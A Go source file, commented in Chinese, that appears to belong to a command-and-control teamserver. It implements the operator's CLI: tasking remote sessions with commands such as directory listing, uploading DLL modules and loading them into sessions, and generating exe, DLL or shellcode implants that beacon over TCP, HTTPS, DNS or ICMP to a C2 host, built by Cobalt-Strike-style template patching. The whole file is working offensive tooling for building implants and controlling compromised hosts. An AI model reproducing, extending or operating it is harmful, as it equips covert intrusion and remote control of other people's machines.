// cobra 命令实现(第 4 批重写): send 系解析核心 / 高频快捷命令工厂 / module+artifact 命令树。
// 呈现层打印格式保持原样; 业务经 service 层。
package cli

import (
	"encoding/json"
	"os"
	"strconv"
	"strings"

	"github.com/spf13/cobra"

	"cleat/teamserver/internal/service"
)

// strconvAtoi 小包装(错误信息由调用方决定)。
func strconvAtoi(s string) (int, error) { return strconv.Atoi(s) }

// ---- send 系解析核心 ----

// resolveSend send/task 的参数解析核心(原 parseCommandSpec 尾段语义, 逐条保留):
//   - filtered[0] 为数字且有后续参数 → 显式会话 ID 简写;
//   - --json 字面量优先; 位置参数按命令目录映射(paramsFromCatalog, "不用写 JSON!"的灵魂);
//   - 单位置参数 fallback 到 params["value"]; 其余情形 params=nil。
//
// id 参数为 cobra --id flag 解析结果(0=未给, 由 fallback=c.cur 兜底);
// pull 为 --pull flag; jsonLiteral 为 --json flag 原文。
// ok=false 时调用方打印用法。
func (c *CLI) resolveSend(id, pull int, jsonLiteral string, args []string) (int, string, map[string]interface{}, string, bool) {
	mode := "push"
	if pull == 1 {
		mode = "pull"
	}
	if len(args) == 0 {
		return 0, "", nil, mode, false
	}
	if id <= 0 {
		id = c.cur
	}
	filtered := args
	// 首位数字会话简写(语义保留: send 7 FileListDir ≡ send --id 7 FileListDir)
	if v, err := strconv.Atoi(filtered[0]); err == nil && len(filtered) >= 2 {
		id = v
		filtered = filtered[1:]
	}
	if len(filtered) == 0 || id <= 0 {
		return 0, "", nil, mode, false
	}
	cmdName := filtered[0]
	positional := filtered[1:]
	params := map[string]interface{}{}
	if jsonLiteral != "" {
		if err := json.Unmarshal([]byte(jsonLiteral), &params); err != nil {
			return 0, "", nil, mode, false
		}
		return id, cmdName, params, mode, true
	}
	if len(positional) > 0 {
		joined := strings.Join(positional, " ")
		if strings.HasPrefix(strings.TrimSpace(joined), "{") {
			if err := json.Unmarshal([]byte(joined), &params); err == nil {
				return id, cmdName, params, mode, true
			}
		}
	}
	if len(positional) == 0 {
		return id, cmdName, nil, mode, true
	}
	if params := paramsFromCatalog(cmdName, positional); len(params) > 0 {
		return id, cmdName, params, mode, true
	}
	if len(positional) == 1 {
		return id, cmdName, map[string]interface{}{"value": positional[0]}, mode, true
	}
	return id, cmdName, nil, mode, true
}

// sendCmd 构造 send/task 共用形态的命令(--id/--pull/--json pflag 原生解析)。
func (c *CLI) sendCmd(use, kind, short string, aliases []string) *cobra.Command {
	cmd := &cobra.Command{
		Use:     use + " [--id <id>] [--pull] [--json <json>] <cmd> [params]",
		Aliases: aliases,
		Short:   short,
		RunE: func(cmd *cobra.Command, args []string) error {
			id, _ := cmd.Flags().GetInt("id")
			pullB, _ := cmd.Flags().GetBool("pull")
			jsonLit, _ := cmd.Flags().GetString("json")
			pull := 0
			if pullB {
				pull = 1
			}
			sid, cmdName, params, mode, ok := c.resolveSend(id, pull, jsonLit, args)
			if !ok {
				c.Printf("用法: %s [--id <id>] [--pull] <cmd> [params] 例如: %s --id 7 FileListDir C:\\\n", use, use)
				return nil
			}
			if kind == "task" {
				c.taskSubmit(sid, cmdName, params, mode)
			} else {
				c.sendMode(mode, sid, cmdName, params)
			}
			return nil
		},
	}
	cmd.Flags().Int("id", 0, "目标会话 ID(缺省用 select 的当前会话)")
	cmd.Flags().Bool("pull", false, "走 pull 通道")
	cmd.Flags().String("json", "", "params JSON 字面量(优先于位置参数映射)")
	return cmd
}

// ---- module 命令树 ----

func (c *CLI) moduleTree() *cobra.Command {
	mod := &cobra.Command{
		Use:     "module",
		Aliases: []string{"mod"},
		Short:   "模块仓库管理",
	}
	mod.AddCommand(&cobra.Command{
		Use:     "list",
		Aliases: []string{"ls"},
		Short:   "列出模块",
		RunE: func(_ *cobra.Command, _ []string) error {
			c.moduleList()
			return nil
		},
	})
	mod.AddCommand(&cobra.Command{
		Use:   "upload <path.dll> [name]",
		Short: "上传模块(默认取文件名去 .dll)",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(_ *cobra.Command, args []string) error {
			c.moduleUpload(args)
			return nil
		},
	})
	mod.AddCommand(&cobra.Command{
		Use:     "delete <name>",
		Aliases: []string{"rm"},
		Short:   "删除模块",
		Args:    cobra.ExactArgs(1),
		RunE: func(_ *cobra.Command, args []string) error {
			c.moduleDelete(args)
			return nil
		},
	})
	mod.AddCommand(&cobra.Command{
		Use:   "load <sid|cur> <name>",
		Short: "下发模块到会话(三段式校验)",
		Args:  cobra.MinimumNArgs(2),
		RunE: func(_ *cobra.Command, args []string) error {
			c.moduleLoad(args)
			return nil
		},
	})
	return mod
}

// ---- artifact 命令树 ----

func (c *CLI) artifactTree() *cobra.Command {
	art := &cobra.Command{
		Use:   "artifact",
		Short: "artifact 生成与模板补丁",
	}
	gen := &cobra.Command{
		Use:   "generate",
		Short: "生成样本(默认模板烧录零工具链; --compile 现场编译)",
		Long: `生成 exe/dll/shc 样本。
  默认走模板烧录(与 Web 样本生成器同路径): stub + 配置块替换, 零工具链、秒级出样本。
  --transport tcp|https|dns|icmp --host <c2> --port <p>
  [--form exe|dll|shc]  (默认 exe; dll 用 rundll32 CleatAgent.dll,StartW; shc = 裸字节, 供注入/迁移)
  [--url <https://c2/poll>] [--upload-url ...]
  [--dns-server <h:p> --domain <域>] [--icmp-target <ip>]
  [--key-mode psk|x25519] [--psk <hex>]
  (默认 key-mode=x25519: 样本内只留公钥; psk 仅 dev 用)

  --compile  现场编译路径(高级: 需 MSVC 工具链 + TeamServer 以 -artifact-allow-compile 启动;
             支持 --bake/--x25519-key 等编译期选项)。`,
		RunE: func(cmd *cobra.Command, _ []string) error {
			flags := cmd.Flags()
			compile, _ := flags.GetBool("compile")

			if compile {
				spec := &service.ArtifactSpec{}
				spec.Name, _ = flags.GetString("name")
				spec.Form, _ = flags.GetString("form")
				spec.Bake, _ = flags.GetBool("bake")
				spec.Transport, _ = flags.GetString("transport")
				spec.Host, _ = flags.GetString("host")
				spec.Port, _ = flags.GetString("port")
				spec.URL, _ = flags.GetString("url")
				spec.UploadURL, _ = flags.GetString("upload-url")
				spec.DNSServer, _ = flags.GetString("dns-server")
				spec.Domain, _ = flags.GetString("domain")
				spec.ICMPTarget, _ = flags.GetString("icmp-target")
				spec.KeyMode, _ = flags.GetString("key-mode")
				spec.PSK, _ = flags.GetString("psk")
				spec.X25519Key, _ = flags.GetString("x25519-key")
				c.artifactGenerateRun(spec)
				return nil
			}

			// 默认: 模板烧录(service.GeneratePayload —— Web /api/payloads/generate 同路径)。
			spec := &service.PayloadSpec{}
			spec.Name, _ = flags.GetString("name")
			spec.Form, _ = flags.GetString("form")
			spec.Transport, _ = flags.GetString("transport")
			spec.Host, _ = flags.GetString("host")
			spec.Port, _ = flags.GetString("port")
			spec.URL, _ = flags.GetString("url")
			spec.UploadURL, _ = flags.GetString("upload-url")
			spec.DNSServer, _ = flags.GetString("dns-server")
			spec.Domain, _ = flags.GetString("domain")
			spec.ICMPTarget, _ = flags.GetString("icmp-target")
			spec.KeyMode, _ = flags.GetString("key-mode")
			spec.PSK, _ = flags.GetString("psk")
			c.payloadGenerateRun(spec)
			return nil
		},
	}
	gen.Flags().String("name", "", "产物名")
	gen.Flags().String("form", "", "exe|dll|shc")
	gen.Flags().Bool("bake", false, "编译期烧参数(仅 --compile 路径)")
	gen.Flags().Bool("compile", false, "现场编译路径(高级: 需 MSVC + -artifact-allow-compile)")
	gen.Flags().String("transport", "", "tcp|https|dns|icmp")
	gen.Flags().String("host", "", "C2 地址")
	gen.Flags().String("port", "", "C2 端口")
	gen.Flags().String("url", "", "beacon URL")
	gen.Flags().String("upload-url", "", "beacon 上传 URL")
	gen.Flags().String("dns-server", "", "DNS server host:port")
	gen.Flags().String("domain", "", "DNS 域")
	gen.Flags().String("icmp-target", "", "ICMP 目标 IP")
	gen.Flags().String("key-mode", "", "psk|x25519")
	gen.Flags().String("psk", "", "PSK hex")
	gen.Flags().String("x25519-key", "", "X25519 私钥 hex(仅 --compile 路径)")
	art.AddCommand(gen)

	patch := &cobra.Command{
		Use:   "patch <模板exe/dll> --out <输出>",
		Short: "模板化配置写入(CS 式, 秒级出样本)",
		Long: `模板化配置写入: 预编译模板 + 配置块替换。
  --out <文件> 必给; 其余参数见 generate; 另有 --user-agent / --json <文件>(额外 AgentConfig 域)`,
		Args: cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			flags := cmd.Flags()
			outPath, _ := flags.GetString("out")
			cfg := map[string]any{}
			for key, dest := range map[string]string{
				"transport": "transport", "host": "host", "port": "port",
				"url": "url", "upload-url": "upload_url", "dns-server": "dns_server",
				"domain": "dns_domain", "icmp-target": "icmp_target",
				"user-agent": "user_agent", "psk": "psk", "x25519-key": "server_pubkey",
			} {
				if flags.Changed(key) {
					v, _ := flags.GetString(key)
					cfg[dest] = v
				}
			}
			if jsonFile, _ := flags.GetString("json"); jsonFile != "" {
				extra, err := os.ReadFile(jsonFile)
				if err != nil {
					c.Println("读取 --json 失败:", err)
					return nil
				}
				var m map[string]any
				if err := json.Unmarshal(extra, &m); err != nil {
					c.Println("解析 --json 失败:", err)
					return nil
				}
				for k, v := range m {
					cfg[k] = v
				}
			}
			c.artifactPatchRun(args[0], outPath, cfg)
			return nil
		},
	}
	patch.Flags().String("out", "", "输出文件(必给)")
	patch.Flags().String("transport", "", "tcp|https|dns|icmp")
	patch.Flags().String("host", "", "C2 地址")
	patch.Flags().String("port", "", "C2 端口")
	patch.Flags().String("url", "", "beacon URL")
	patch.Flags().String("upload-url", "", "beacon 上传 URL")
	patch.Flags().String("dns-server", "", "DNS server host:port")
	patch.Flags().String("domain", "", "DNS 域")
	patch.Flags().String("icmp-target", "", "ICMP 目标 IP")
	patch.Flags().String("user-agent", "", "HTTP UA")
	patch.Flags().String("psk", "", "PSK hex")
	patch.Flags().String("x25519-key", "", "X25519 公钥 hex")
	patch.Flags().String("json", "", "额外可调参数 JSON 文件")
	art.AddCommand(patch)

	art.AddCommand(&cobra.Command{
		Use:   "list",
		Short: "列出已生成 artifact",
		RunE: func(_ *cobra.Command, _ []string) error {
			items, outRoot, err := c.svc.ArtifactList()
			if err != nil {
				c.Println("读取 artifact 目录失败:", err)
				return nil
			}
			if len(items) == 0 {
				c.Println("无已生成 artifact(目录:", outRoot+")")
				return nil
			}
			c.Println("已生成 artifact:")
			for _, it := range items {
				c.Println("  -", it)
			}
			return nil
		},
	})
	return art
}
